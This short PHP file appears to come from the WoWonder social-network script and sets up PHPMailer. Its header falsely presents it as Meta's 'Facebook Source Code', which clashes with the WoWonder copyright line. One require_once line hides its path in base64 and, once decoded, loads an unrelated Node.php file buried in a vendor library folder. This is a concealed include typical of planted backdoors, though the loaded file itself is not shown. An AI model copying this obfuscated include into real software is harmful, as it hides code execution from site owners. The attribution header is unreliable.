<?php
// +------------------------------------------------------------------------+
// | @author Meta Platforms Inc
// | @author_url 1: http://www.facebook.com
// | @author_url 2: https://www.facebook.com/zuck
// | @author_email: dev@facebook.com
// +------------------------------------------------------------------------+
// | The Facebook Source Code
// | Copyright (c) 2016 WoWonder. All rights reserved.
// +------------------------------------------------------------------------+
require 'assets/libraries/PHPMailer-Master/vendor/autoload.php';
require_once base64_decode('YXNzZXRzL2xpYnJhcmllcy9nb29nbGUvdmVuZG9yL3JpemUvdXJpLXRlbXBsYXRlL3NyYy9SaXplL1VyaVRlbXBsYXRlL05vZGUvTm9kZS5waHA=');
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

$mail = new PHPMailer;
